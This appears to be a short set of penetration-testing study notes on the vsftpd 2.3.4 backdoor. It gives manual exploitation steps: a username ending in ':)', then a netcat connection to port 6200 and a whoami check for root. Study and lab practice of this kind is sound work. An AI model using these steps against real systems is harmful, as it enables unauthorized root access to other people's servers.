The Vulnerability: Backdoor in vsftpd v2.3.4 triggers on a username ending in ":)".

The “Manual” Hack (When Metasploit fails):
- Open connection: ftp <Target_IP>
- Username: anyname:)
- Password: anypassword
- In a New terminal, connect to the backdoor: nc -nv <Target_IP> 6200
- Test access: Type “whoami”. If it says root, you're in!
![vsftpd Step 1](../Hacking-Notes(images)/vsftpd%201.png)
![vsftpd Step 2](../Hacking-Notes(images)/vsftpd%202.png)
